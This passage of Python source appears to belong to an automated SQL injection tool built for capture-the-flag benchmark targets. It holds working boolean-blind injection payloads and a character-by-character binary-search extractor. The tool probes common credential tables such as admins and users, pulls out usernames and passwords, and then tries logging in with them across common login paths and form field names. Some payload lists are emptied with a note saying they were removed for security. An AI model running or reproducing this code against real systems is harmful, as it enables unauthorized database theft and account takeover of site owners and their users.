            ("", " OR 1=1-- -", " AND 1=2-- -"),
        ]

        working_quote = None
        true_response = None
        false_response = None

        for quote, true_payload, false_payload in quote_tests:
            # Don't prepend "test" - use the payload directly for OR-based tests
            true_resp = await self._fetch(page, target_url, parameter, true_payload, location)
            false_resp = await self._fetch(page, target_url, parameter, false_payload, location)

            # Check for difference (boolean blind indicator)
            true_len = len(true_resp)
            false_len = len(false_resp)

            self.logger.debug(f"[BLIND-EXTRACT] Testing {quote or 'numeric'}: TRUE={true_len}, FALSE={false_len}")

            # TRUE should return more content (valid query results), FALSE should return less/error
            # Lower threshold to catch smaller differences (XBEN-040-24 has ~37 byte diff)
            if true_len != false_len and abs(true_len - false_len) > 20:
                # Significant difference detected
                working_quote = quote
                true_response = true_resp
                false_response = false_resp
                self.logger.info(f"[BLIND-EXTRACT] ✓ Found working context: {quote or 'numeric'} quote")
                self.logger.info(f"[BLIND-EXTRACT]   TRUE len={true_len}, FALSE len={false_len}, diff={abs(true_len - false_len)}")
                break

        if working_quote is None:
            self.logger.info("[BLIND-EXTRACT] No boolean blind context detected")
            return {'vulnerable': False}

        # Step 2: Try to extract from common credential tables
        self.logger.info("[BLIND-EXTRACT] Attempting credential extraction from common tables...")

        # Common table/column combinations for credentials
        credential_targets = [
            ('admins', 'username', 'password'),
            ('admins', 'user', 'pass'),
            ('admins', 'login', 'password'),
            ('admin', 'username', 'password'),
            ('users', 'username', 'password'),
            ('users', 'user', 'pass'),
            ('user', 'username', 'password'),
            ('accounts', 'username', 'password'),
            ('members', 'username', 'password'),
            ('flag', 'flag', None),  # Direct flag table
            ('flags', 'flag', None),
            ('flag', 'value', None),
        ]

        extracted_creds = {}

        for table, user_col, pass_col in credential_targets:
            self.logger.info(f"[BLIND-EXTRACT] Trying table: {table}")

            # First check if table exists using OR-based test (works regardless of base value)
            if working_quote == "'":
                exists_payload = f"' OR (SELECT 1 FROM {table} LIMIT 1)=1 AND '1'='1"
            elif working_quote == '"':
                exists_payload = f'" OR (SELECT 1 FROM {table} LIMIT 1)=1 AND "1"="1'
            else:
                exists_payload = f" OR (SELECT 1 FROM {table} LIMIT 1)=1 AND 1=1"

            exists_resp = await self._fetch(page, target_url, parameter, exists_payload, location)

            # If response similar to TRUE response, table likely exists
            if abs(len(exists_resp) - len(true_response)) < 50:
                self.logger.info(f"[BLIND-EXTRACT] ✓ Table '{table}' appears to exist!")

                # Extract username
                username = await self._extract_column_blind(
                    page, target_url, parameter, location,
                    table, user_col, working_quote, true_response
                )

                if username:
                    self.logger.info(f"[BLIND-EXTRACT] ✓ Extracted {user_col}: {username}")
                    extracted_creds['username'] = username
                    extracted_creds['table'] = table

                    # Extract password if column specified
                    if pass_col:
                        password = await self._extract_column_blind(
                            page, target_url, parameter, location,
                            table, pass_col, working_quote, true_response
                        )

                        if password:
                            self.logger.info(f"[BLIND-EXTRACT] ✓ Extracted {pass_col}: {password}")
                            extracted_creds['password'] = password

                            # We have both - try to login!
                            break
                    else:
                        # This might be a flag, not credentials
                        if 'FLAG{' in username or 'flag{' in username:
                            self.logger.info(f"[BLIND-EXTRACT] ✓✓✓ FLAG FOUND: {username}")
                            return {
                                'vulnerable': True,
                                'type': 'boolean_blind_extraction',
                                'confidence': 95,
                                'database': 'mysql',
                                'payload': 'Blind SQLi extraction',
                                'extracted_data': {'flag': username}
                            }

        # Step 3: If we extracted credentials, try to login
        if extracted_creds.get('username') and extracted_creds.get('password'):
            self.logger.info("[BLIND-EXTRACT] Attempting login with extracted credentials...")

            flag = await self._attempt_login_with_creds(
                target_url,
                extracted_creds['username'],
                extracted_creds['password']
            )

            if flag:
                self.logger.info(f"[BLIND-EXTRACT] ✓✓✓ FLAG FOUND via login: {flag}")
                return {
                    'vulnerable': True,
                    'type': 'boolean_blind_extraction',
                    'confidence': 95,
                    'database': 'mysql',
                    'payload': 'Blind SQLi → Credential Extraction → Login',
                    'extracted_data': {
                        'username': extracted_creds['username'],
                        'password': extracted_creds['password'],
                        'table': extracted_creds.get('table', 'unknown'),
                        'flag': flag
                    }
                }
            else:
                # Credentials extracted but login didn't return flag
                self.logger.info("[BLIND-EXTRACT] Credentials extracted but login didn't yield FLAG")
                return {
                    'vulnerable': True,
                    'type': 'boolean_blind_extraction',
                    'confidence': 85,
                    'database': 'mysql',
                    'payload': 'Blind SQLi extraction',
                    'extracted_data': extracted_creds
                }

        # No credentials found
        if extracted_creds:
            return {
                'vulnerable': True,
                'type': 'boolean_blind',
                'confidence': 75,
                'database': 'mysql',
                'payload': 'Blind SQLi detected',
                'extracted_data': extracted_creds
            }

        return {'vulnerable': False}

    async def _extract_column_blind(
        self,
        page: Page,
        target_url: str,
        parameter: str,
        location: str,
        table: str,
        column: str,
        quote: str,
        true_response: str
    ) -> str:
        """
        Extract a column value character by character using boolean blind SQLi

        Uses OR-based approach that works regardless of base value:
        ' OR (SELECT ASCII(SUBSTRING(col,pos,1)) FROM table LIMIT 1)=X AND '1'='1
        """

        extracted = ""
        max_length = 50  # Max chars to extract
        true_len = len(true_response)

        self.logger.info(f"[BLIND-EXTRACT] Extracting {table}.{column} (TRUE response len={true_len})")

        for position in range(1, max_length + 1):
            char_found = False

            # Binary search for faster extraction
            low, high = 32, 126

            while low <= high:
                mid = (low + high) // 2

                # Build OR-based payload: TRUE if ASCII >= mid
                if quote == "'":
                    payload = f"' OR (SELECT ASCII(SUBSTRING({column},{position},1)) FROM {table} LIMIT 1)>={mid} AND '1'='1"
                elif quote == '"':
                    payload = f'" OR (SELECT ASCII(SUBSTRING({column},{position},1)) FROM {table} LIMIT 1)>={mid} AND "1"="1'
                else:
                    payload = f" OR (SELECT ASCII(SUBSTRING({column},{position},1)) FROM {table} LIMIT 1)>={mid} AND 1=1"

                response = await self._fetch(page, target_url, parameter, payload, location)
                resp_len = len(response)

                # If response matches TRUE pattern, ASCII >= mid
                # Use threshold smaller than the TRUE/FALSE difference (37 bytes in XBEN-040-24)
                if abs(resp_len - true_len) < 15:
                    low = mid + 1
                else:
                    high = mid - 1

            # After binary search, high is the ASCII value (or low-1 if not found)
            if high >= 32:
                # Verify exact match
                if quote == "'":
                    verify_payload = f"' OR (SELECT ASCII(SUBSTRING({column},{position},1)) FROM {table} LIMIT 1)={high} AND '1'='1"
                elif quote == '"':
                    verify_payload = f'" OR (SELECT ASCII(SUBSTRING({column},{position},1)) FROM {table} LIMIT 1)={high} AND "1"="1'
                else:
                    verify_payload = f" OR (SELECT ASCII(SUBSTRING({column},{position},1)) FROM {table} LIMIT 1)={high} AND 1=1"

                verify_resp = await self._fetch(page, target_url, parameter, verify_payload, location)

                if abs(len(verify_resp) - true_len) < 15:
                    char = chr(high)
                    extracted += char
                    char_found = True

                    # Show progress
                    if position <= 5 or position % 5 == 0:
                        self.logger.info(f"[BLIND-EXTRACT] Position {position}: '{char}' → {extracted}")

            if not char_found:
                # No more characters - reached end of value
                self.logger.info(f"[BLIND-EXTRACT] Extraction complete at position {position}")
                break

        return extracted

    async def _attempt_login_with_creds(
        self,
        target_url: str,
        username: str,
        password: str
    ) -> str:
        """
        Attempt to login with extracted credentials and return FLAG if found
        """
        import aiohttp
        from urllib.parse import urlparse, urljoin

        parsed = urlparse(target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        # Common login paths
        login_paths = [
            '/admin.php',
            '/login.php',
            '/admin/login.php',
            '/admin',
            '/login',
            '/signin',
            '/auth',
            '/dashboard',
        ]

        self.logger.info(f"[LOGIN] Trying login with {username}:{password}")

        try:
            async with aiohttp.ClientSession() as session:
                for path in login_paths:
                    login_url = urljoin(base_url, path)

                    # Try different form field names
                    form_variants = [
                        {'username': username, 'password': password},
                        {'user': username, 'pass': password},
                        {'login': username, 'password': password},
                        {'email': username, 'password': password},
                        {'name': username, 'password': password},
                    ]

                    for form_data in form_variants:
                        try:
                            async with session.post(
                                login_url,
                                data=form_data,
                                timeout=aiohttp.ClientTimeout(total=10),
                                allow_redirects=True
                            ) as resp:
                                response_text = await resp.text()

                                # Check for FLAG in response
                                flag_match = re.search(r'FLAG\{[^}]+\}|flag\{[^}]+\}|CTF\{[^}]+\}', response_text, re.I)

                                if flag_match:
                                    return flag_match.group(0)

                                # Check for successful login indicators
                                if any(indicator in response_text.lower() for indicator in ['welcome', 'dashboard', 'logged in', 'success']):
                                    self.logger.info(f"[LOGIN] ✓ Login succeeded at {login_url}")

                                    # Try to access common flag locations
                                    flag_paths = ['/flag.txt', '/flag', '/admin/flag', '/dashboard', '/']
                                    for flag_path in flag_paths:
                                        flag_url = urljoin(base_url, flag_path)
                                        async with session.get(flag_url) as flag_resp:
                                            flag_text = await flag_resp.text()
                                            flag_match = re.search(r'FLAG\{[^}]+\}|flag\{[^}]+\}|CTF\{[^}]+\}', flag_text, re.I)
                                            if flag_match:
                                                return flag_match.group(0)

                        except Exception as e:
                            self.logger.debug(f"[LOGIN] Error trying {login_url}: {e}")
                            continue

        except Exception as e:
            self.logger.error(f"[LOGIN] Session error: {e}")

        return None

    async def _test_time_based(
        self,
        page: Page,
        target_url: str,
        parameter: str,
        location: str
    ) -> Dict:
        """Time-based detection (slow - only if nothing else works)"""

        import time

        # Measure baseline
        start = time.time()
        await self._fetch(page, target_url, parameter, "test", location)
        baseline_time = time.time() - start

        # NOTE: Static payloads removed for security purposes.
        # Time-based payloads generated dynamically by LLM engine.
        payloads = []

        for payload in payloads:
            start = time.time()
            await self._fetch(page, target_url, parameter, payload, location)
            test_time = time.time() - start

            delay = test_time - baseline_time

            if 2.5 <= delay <= 3.5:  # Within 0.5s of expected delay
                return {
                    'vulnerable': True,
                    'type': 'time_blind',
                    'confidence': 85,
                    'database': 'mysql' if 'SLEEP' in payload else 'postgresql',
                    'payload': payload,
                    'exploit_url': self._build_url(target_url, parameter, payload),
                    'delay': delay
                }

        return {'vulnerable': False}

    async def _fetch(
        self,
        page: Page,
        target_url: str,
        parameter: str,
        payload: str,
        location: str
    ) -> str:
        """Fetch response with payload injected"""

        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

        try:
            if location == "query":
                # Inject into URL
                parsed = urlparse(target_url)
                params = parse_qs(parsed.query) if parsed.query else {}
                params[parameter] = [payload]

                new_query = urlencode(params, doseq=True)
                test_url = urlunparse((
                    parsed.scheme,
                    parsed.netloc,
                    parsed.path,
                    parsed.params,
                    new_query,
                    parsed.fragment
                ))

                try:
                    await page.goto(test_url, wait_until='load', timeout=5000)
                except:
                    try:
                        await page.goto(test_url, wait_until='domcontentloaded', timeout=3000)
                    except:
                        pass  # Continue anyway

                return await page.content()

            elif location == "body":
                # POST request with JSON body - use aiohttp directly
                import json
                import aiohttp

                # Build JSON body with payload
                body_data = {parameter: payload}

                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.post(
                            target_url,
                            json=body_data,
                            timeout=aiohttp.ClientTimeout(total=10)
                        ) as resp:
                            response_text = await resp.text()
                            self.logger.debug(f"[FETCH] POST {target_url} with {parameter}={payload[:30]}... → status={resp.status}, len={len(response_text)}")
                            return response_text
                except Exception as e:
                    self.logger.warning(f"Fetch error for body param: {str(e)[:60]}")
                    return ""

            elif location == "post":
                # POST request with form data (application/x-www-form-urlencoded)
                import aiohttp

                # Build form data with payload
                # Include common form field names with dummy values to ensure form submission works
                form_data = {
                    # Common contact form fields
                    'fullname': 'test',
                    'name': 'test',
                    'email': 'test@test.com',
                    'phone': '123',
                    'subject': 'test',
                    'message': 'test',
                    # Common auth form fields
                    'username': 'test',
                    'password': 'test',
                    # Other common fields
                    'submit': '1',
                    'id': '1',
                    'search': 'test',
                    'query': 'test',
                }

                # Override the specific parameter being tested with the payload
                form_data[parameter] = payload

                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.post(
                            target_url,
                            data=form_data,  # Use data= for form encoding, not json=
                            timeout=aiohttp.ClientTimeout(total=10)
                        ) as resp:
                            response_text = await resp.text()
                            self.logger.debug(f"[FETCH] POST form {target_url} with {parameter}={payload[:30]}... → status={resp.status}, len={len(response_text)}")
                            return response_text
                except Exception as e:
                    self.logger.warning(f"Fetch error for POST form param: {str(e)[:60]}")
                    return ""

            # Other locations not implemented yet
            return ""

        except Exception as e:
            self.logger.warning(f"Fetch error: {str(e)[:60]}")
            return ""

    def _extract_error_info(self, html: str) -> Dict:
        """Extract database error information from response"""

        error_patterns = {
            'mysql': [
                r'You have an error in your SQL syntax',
                r'mysql_fetch',
                r'MySQL server version',
                r'supplied argument is not a valid MySQL'
            ],
            'postgresql': [
                r'PostgreSQL.*ERROR',
                r'pg_query\(\)',
                r'pg_exec\(\)',
                r'PSQLException'
            ],
            'mssql': [
                r'Microsoft SQL Server',
                r'ODBC SQL Server Driver',
                r'SQLServer JDBC Driver'
            ],
            'oracle': [
                r'ORA-\d{5}',
                r'Oracle error',
                r'Oracle.*Driver'
            ]
        }

        html_lower = html.lower()

        for db_type, patterns in error_patterns.items():
            for pattern in patterns:
                if re.search(pattern, html, re.I):
                    # Extract error message
                    error_match = re.search(r'(error|exception|warning)[:\s]+(.{0,200})', html, re.I)
                    message = error_match.group(2) if error_match else pattern

                    # Look for leaked data (in error messages)
                    leaked = {}
                    version_match = re.search(r'version[:\s]+([^\s<]+)', html, re.I)
                    if version_match:
                        leaked['version'] = version_match.group(1)

                    return {
                        'has_error': True,
                        'database': db_type,
                        'message': message,
                        'leaked_data': leaked
                    }

        return {'has_error': False}

    def _has_sql_error(self, html: str) -> bool:
        """Check if response contains SQL error"""
        return self._extract_error_info(html)['has_error']

    def _extract_text(self, html: str) -> str:
        """Extract visible text from HTML"""
        # Remove HTML tags
        text = re.sub(r'<[^>]+>', ' ', html)
        # Remove extra whitespace
        text = re.sub(r'\s+', ' ', text)
        return text.strip()

    def _build_url(self, target_url: str, parameter: str, payload: str) -> str:
        """Build exploit URL"""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote

        parsed = urlparse(target_url)
        params = parse_qs(parsed.query) if parsed.query else {}
        params[parameter] = [payload]

        new_query = urlencode(params, doseq=True, quote_via=quote)
        return urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            parsed.fragment
        ))

    async def _verify_graphql_sqli(
        self,
        target_url: str,
        parameter: str,
        graphql_field: str,
        filter_profile=None,
        return_fields: List[str] = None
    ) -> Dict:
        """
        Test GraphQL endpoint for SQL injection vulnerabilities

        Args:
            target_url: GraphQL endpoint URL (e.g., http://127.0.0.1:32769/graphql/)
            parameter: Parameter name (e.g., "jobType")
            graphql_field: GraphQL query field name (e.g., "jobs")
            filter_profile: Optional filter bypass profile
            return_fields: List of fields to request in GraphQL response (discovered via introspection)

        Returns:
            Dict with vulnerability results
        """
        import aiohttp
        import json

        self.logger.info(f"[GRAPHQL] Testing GraphQL SQLi on {graphql_field}({parameter})")

        # Set filter profile
        self.filter_profile = filter_profile

        # Use discovered fields or fallback to common ones
        if not return_fields or len(return_fields) == 0:
            return_fields = ['id', 'name', 'type', 'description']
            self.logger.info(f"[GRAPHQL] No return fields discovered, using fallback: {return_fields}")
        else:
            self.logger.info(f"[GRAPHQL] Using discovered return fields: {return_fields}")

        # Build GraphQL field selection string
        fields_str = ' '.join(return_fields)

        # GraphQL SQLi payloads
        # NOTE: Static payloads removed for security purposes.
        sqli_payloads = []

        # Apply bypass if needed
        if self.filter_profile:
            sqli_payloads = [self._apply_bypass(p) for p in sqli_payloads]

        try:
            async with aiohttp.ClientSession() as session:
                # First, get baseline response
                baseline_query = {
                    "query": f"{{ {graphql_field}({parameter}: \"test\") {{ {fields_str} }} }}"
                }

                self.logger.debug(f"[GRAPHQL] Baseline query: {baseline_query['query']}")

                async with session.post(
                    target_url,
                    json=baseline_query,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    baseline_text = await resp.text()
                    baseline_json = json.loads(baseline_text) if baseline_text else {}

                self.logger.info(f"[GRAPHQL] Baseline response: {len(baseline_text)} bytes")

                # Test each SQLi payload
                for payload in sqli_payloads:
                    # Build GraphQL query with SQLi payload
                    # Note: Need to escape quotes inside the GraphQL string
                    escaped_payload = payload.replace('"', '\\"')

                    graphql_query = {
                        "query": f'{{ {graphql_field}({parameter}: "{escaped_payload}") {{ {fields_str} }} }}'
                    }

                    self.logger.debug(f"[GRAPHQL] Testing: {graphql_query['query'][:100]}...")

                    async with session.post(
                        target_url,
                        json=graphql_query,
                        timeout=aiohttp.ClientTimeout(total=10)
                    ) as resp:
                        response_text = await resp.text()
                        response_json = json.loads(response_text) if response_text else {}

                    # Check for FLAG pattern in response
                    flag_match = re.search(r'FLAG\{[^}]+\}|flag\{[^}]+\}|CTF\{[^}]+\}', response_text, re.I)

                    if flag_match:
                        flag_value = flag_match.group(0)
                        self.logger.info(f"[GRAPHQL] ✓✓✓ FLAG FOUND!")
                        self.logger.info(f"    → {flag_value}")

                        # Extract all data from response
                        extracted_data = {'flag': flag_value}

                        if 'data' in response_json and graphql_field in response_json['data']:
                            data_items = response_json['data'][graphql_field]
                            if isinstance(data_items, list):
                                for item in data_items:
                                    if isinstance(item, dict):
                                        for key, value in item.items():
                                            if 'FLAG' in str(value).upper() or 'flag' in str(value):
                                                extracted_data[f'{graphql_field}_{key}'] = value

                        return {
                            'vulnerable': True,
                            'type': 'union_based',
                            'confidence': 95,
                            'database': 'unknown',
                            'payload': payload,
                            'exploit_url': f"{target_url} (GraphQL: {graphql_field}({parameter}))",
                            'extracted_data': extracted_data
                        }

                    # Check if response different from baseline (potential SQLi)
                    elif len(response_text) != len(baseline_text):
                        # Response length changed - potential SQLi
                        baseline_count = len(baseline_json.get('data', {}).get(graphql_field, []))
                        response_count = len(response_json.get('data', {}).get(graphql_field, []))

                        if response_count > baseline_count:
                            self.logger.info(f"[GRAPHQL] ✓ Response changed! Baseline: {baseline_count} rows, SQLi: {response_count} rows")

                            # Extract data
                            extracted_data = {}
                            if 'data' in response_json and graphql_field in response_json['data']:
                                data_items = response_json['data'][graphql_field]
                                if isinstance(data_items, list):
                                    for i, item in enumerate(data_items):
                                        if isinstance(item, dict):
                                            # Check for sensitive data
                                            desc = item.get('description', '')
                                            if desc and desc not in [d.get('description', '') for d in baseline_json.get('data', {}).get(graphql_field, [])]:
                                                extracted_data[f'row_{i}'] = item

                            return {
                                'vulnerable': True,
                                'type': 'union_based',
                                'confidence': 85,
                                'database': 'unknown',
                                'payload': payload,
                                'exploit_url': f"{target_url} (GraphQL: {graphql_field}({parameter}))",
                                'extracted_data': extracted_data
                            }

        except Exception as e:
            self.logger.error(f"[GRAPHQL] Error: {e}")
            import traceback
            self.logger.debug(traceback.format_exc())

        return {'vulnerable': False}
